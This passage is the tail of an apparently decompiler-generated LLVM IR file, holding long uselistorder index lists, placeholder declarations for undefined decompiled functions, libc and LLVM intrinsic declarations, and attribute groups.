1602, 1571, 1572, 694, 228, 371, 739, 13, 14, 1595, 1052, 903, 1594, 1228, 1335, 136, 230, 1336, 695, 229, 1337, 1338, 1585, 1586, 1587, 1588, 513, 1589, 166, 982, 983, 66, 67, 119, 1339, 1340, 108, 390, 1344, 1341, 1342, 696, 1343, 1345, 697, 1346, 1347, 1348, 1349, 68, 69, 120, 1350, 231, 1351, 1352, 1353, 1355, 1354, 389, 740, 742, 741, 232, 743, 744, 745, 514, 746, 167, 1573, 1574, 984, 985, 986, 987, 988, 989, 234, 168, 990, 991, 992, 137, 233, 993, 169, 516, 517, 1590, 515, 170, 171, 1285, 1286, 1287, 1288, 1289, 235, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 236, 1280, 518, 1281, 1282, 519, 1283, 1284, 172, 698, 237, 238, 1251, 520, 239, 1252, 1253, 1254, 1255, 1256, 247, 244, 245, 240, 241, 246, 249, 248, 242, 243, 1297, 1298, 1322, 1323, 173, 1299, 1300, 253, 251, 252, 1301, 1302, 259, 258, 184, 250, 1303, 1304, 1305, 1306, 1307, 1308, 413, 412, 445, 521, 1309, 1310, 1311, 104, 1312, 255, 254, 256, 257, 183, 1313, 1314, 391, 1315, 1316, 144, 1317, 1318, 1319, 1320, 1321, 15, 16, 904, 905, 105, 17, 446, 522, 1229, 260, 1230, 1232, 1231, 1204, 1203, 1181, 1180, 907, 906, 994, 908, 909, 1206, 174, 1205, 1207, 911, 910, 1274, 1605, 1606, 121, 175, 1012, 1013, 1014, 261, 900, 901, 262, 1015, 1020, 1021, 1022, 1023, 263, 1016, 264, 1017, 1018, 1024, 995, 523, 1182, 1591, 1592, 1593, 912, 914, 913, 1025, 915, 1356, 916, 917, 918, 1596, 1597, 1598, 1019, 18, 1442, 1443, 1444, 142, 1445, 1446, 1447, 1448, 1449, 265, 1450, 699, 702, 700, 701, 1451, 703, 185, 266, 1026, 1027, 138, 402, 1028, 1029, 704, 19, 392, 267, 268, 269, 70, 270, 524, 919, 1030, 1031, 1032, 1259, 1258, 1260, 1261, 1262, 1263, 46, 271, 1264, 1265, 1266, 272, 129, 130, 479, 480, 902, 274, 273, 275, 1033, 276, 1034, 1035, 277, 1324, 1325, 525, 278, 1036, 279, 280, 1083, 281, 1053, 282, 283, 927, 920, 284, 921, 922, 923, 732, 733, 735, 720, 721, 709, 722, 734, 723, 710, 724, 711, 725, 712, 726, 713, 727, 728, 131, 71, 374, 375, 729, 714, 730, 715, 731, 736, 737, 526, 738, 924, 705, 925, 527, 926, 394, 393, 928, 929, 930, 931, 286, 285, 932, 933, 934, 716, 372, 935, 122, 123, 373, 936, 124, 125, 528, 938, 939, 706, 940, 941, 942, 943, 944, 529, 945, 946, 947, 403, 186, 708, 948, 949, 950, 951, 952, 953, 707, 954, 955, 530, 956, 531, 957, 960, 961, 962, 287, 958, 288, 959, 289, 937, 1054, 1055, 963, 532, 964, 966, 290, 967, 968, 969, 970, 971, 972, 973, 292, 291, 974, 533, 975, 534, 976, 535, 965, 977, 414, 980, 536, 981, 537, 978, 979, 538, 297, 296, 717, 176, 299, 298, 718, 177, 719, 295, 294, 293, 396, 404, 397, 539, 996, 300, 301, 1004, 997, 998, 999, 1000, 1001, 1002, 1003, 395, 1005, 1006, 72, 1007, 302, 540, 139, 1037, 1038, 1039, 1040, 400, 1041, 1042, 1043, 399, 1044, 1045, 1046, 1047, 303, 1048, 1050, 1049, 178, 179, 304, 398, 306, 305, 1051, 307, 308, 106, 309, 312, 1056, 1057, 1058, 1059, 311, 310, 313, 1060, 1061, 73, 74, 187, 143, 314, 107, 542, 1062, 1063, 1064, 1065, 1066, 315, 1067, 1068, 449, 1069, 1070, 1071, 1072, 319, 316, 317, 318, 1073, 1074, 1075, 1076, 543, 1077, 1078, 448, 1079, 541, 1080, 447, 1081, 544, 1082, 321, 1084, 1085, 1086, 1087, 320, 322, 1088, 1089, 75, 76, 132, 1090, 323, 1091, 1092, 452, 1093, 450, 1094, 451, 1095, 327, 1097, 1098, 1099, 1100, 326, 325, 328, 1101, 1102, 77, 78, 1096, 324, 1103, 1104, 329, 1105, 1106, 455, 1107, 454, 1108, 453, 1109, 545, 1110, 547, 133, 79, 1111, 180, 456, 548, 1112, 1113, 330, 331, 1114, 546, 1115, 334, 1116, 1117, 1118, 1119, 333, 332, 335, 1120, 1121, 80, 81, 181, 1122, 1123, 20, 21, 22, 23, 1124, 1125, 336, 458, 1126, 549, 1127, 550, 1128, 551, 1129, 552, 1130, 553, 1131, 554, 1132, 457, 1133, 340, 1135, 1136, 1137, 1138, 338, 337, 341, 1139, 1140, 82, 83, 1134, 339, 1142, 1141, 24, 25, 26, 27, 1143, 342, 1144, 1145, 460, 1146, 555, 1147, 556, 1148, 557, 1149, 558, 1150, 559, 1151, 560, 1152, 459, 1153, 561, 1154, 346, 1156, 1157, 1158, 1159, 344, 343, 347, 1160, 1161, 84, 85, 1155, 345, 1162, 86, 562, 1163, 1165, 1166, 1167, 1168, 563, 1169, 28, 29, 30, 31, 32, 1164, 348, 1170, 1171, 466, 1172, 465, 1173, 464, 1174, 463, 1175, 461, 1176, 462, 1177, 564, 1178, 352, 1184, 1185, 1186, 1187, 350, 349, 353, 1188, 1189, 87, 88, 1183, 351, 1190, 89, 565, 1191, 1193, 1194, 1195, 1196, 566, 1197, 33, 34, 35, 36, 37, 1192, 354, 1198, 1199, 468, 1200, 467, 1201, 567, 1202, 569, 134, 90, 1208, 182, 469, 570, 571, 1209, 1210, 355, 356, 1211, 568, 1214, 1215, 1216, 358, 359, 1217, 1218, 91, 1212, 1213, 357, 1220, 1219, 1221, 360, 1222, 1223, 472, 1224, 471, 1225, 470, 1226, 572, 1227, 1234, 1235, 1236, 362, 363, 364, 1238, 1239, 92, 1237, 1233, 361, 1241, 1242, 1240, 1243, 365, 1244, 1245, 475, 1246, 474, 1247, 473, 1248, 573, 1249, 415, 1257, 1267, 366, 1268, 1275, 367, 1276, 1326, 145, 1327, 1328, 416, 574, 401, 1329, 1330, 47, 405, 1331, 1332, 575, 1357, 368, 1358, 476, 747, 477, 478, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621 }
  uselistorder i32* @r4, { 88, 847, 848, 849, 850, 851, 869, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 10, 866, 867, 868, 870, 871, 872, 873, 874, 875, 876, 877, 95, 96, 97, 98, 141, 11, 142, 143, 144, 12, 145, 146, 147, 148, 149, 150, 151, 0, 13, 152, 153, 154, 155, 156, 157, 158, 159, 218, 219, 878, 89, 90, 91, 880, 881, 882, 5, 885, 58, 879, 764, 765, 99, 100, 101, 102, 103, 104, 105, 106, 107, 886, 887, 160, 161, 14, 4, 162, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 15, 163, 164, 165, 166, 167, 168, 169, 170, 189, 16, 190, 191, 171, 172, 174, 17, 175, 178, 18, 179, 180, 19, 181, 182, 20, 183, 184, 21, 185, 186, 22, 187, 55, 188, 173, 192, 23, 193, 194, 195, 196, 197, 198, 199, 176, 177, 92, 93, 94, 59, 108, 109, 110, 111, 24, 112, 25, 26, 113, 114, 115, 116, 117, 118, 119, 124, 125, 27, 126, 127, 28, 128, 129, 29, 130, 131, 30, 132, 133, 31, 134, 135, 32, 136, 137, 120, 121, 122, 123, 138, 139, 140, 200, 201, 202, 33, 203, 204, 205, 34, 206, 207, 208, 209, 210, 211, 53, 212, 213, 214, 215, 216, 217, 220, 221, 222, 223, 369, 224, 883, 884, 829, 830, 831, 832, 833, 834, 728, 729, 370, 371, 904, 905, 906, 769, 770, 57, 909, 54, 910, 911, 912, 928, 930, 931, 932, 929, 913, 918, 926, 927, 907, 919, 920, 921, 922, 60, 61, 62, 835, 836, 6, 35, 837, 36, 838, 839, 840, 914, 915, 841, 80, 81, 82, 83, 84, 85, 908, 916, 917, 225, 226, 227, 228, 771, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 37, 789, 790, 791, 792, 772, 773, 774, 775, 776, 730, 731, 732, 733, 734, 735, 736, 737, 738, 38, 739, 740, 741, 742, 743, 744, 745, 746, 747, 793, 815, 816, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 56, 807, 808, 1, 809, 810, 811, 812, 813, 814, 232, 233, 234, 696, 697, 698, 699, 700, 703, 704, 705, 701, 702, 652, 653, 654, 655, 656, 657, 658, 603, 604, 605, 608, 609, 610, 606, 607, 235, 236, 237, 238, 239, 240, 241, 63, 242, 243, 659, 660, 661, 662, 663, 664, 665, 244, 245, 246, 247, 248, 249, 372, 373, 374, 375, 376, 377, 378, 229, 230, 231, 379, 380, 381, 382, 9, 383, 384, 385, 386, 387, 388, 389, 250, 251, 252, 255, 256, 257, 253, 254, 258, 259, 260, 261, 262, 263, 923, 924, 925, 264, 265, 266, 390, 391, 392, 393, 394, 267, 268, 269, 270, 271, 453, 454, 412, 413, 272, 273, 274, 275, 276, 277, 278, 279, 75, 76, 77, 280, 281, 282, 283, 78, 66, 67, 64, 65, 68, 69, 70, 71, 72, 73, 74, 79, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 302, 303, 304, 305, 312, 313, 314, 315, 316, 7, 306, 307, 308, 309, 310, 311, 298, 299, 300, 301, 706, 707, 414, 415, 416, 417, 418, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 336, 337, 338, 339, 340, 341, 86, 330, 331, 332, 333, 334, 335, 342, 39, 40, 41, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 395, 396, 8, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 42, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 2, 492, 493, 494, 495, 496, 497, 498, 499, 43, 500, 44, 501, 45, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 46, 526, 47, 527, 48, 528, 49, 529, 530, 531, 532, 50, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 51, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 52, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 666, 667, 668, 3, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 766, 767, 768, 817, 818, 821, 819, 820, 822, 823, 824, 825, 826, 827, 828, 842, 843, 844, 845, 87, 846 }
}

declare i32 @__libc_errno() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64* @__decompiler_undefined_function_5() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_8() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_9() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
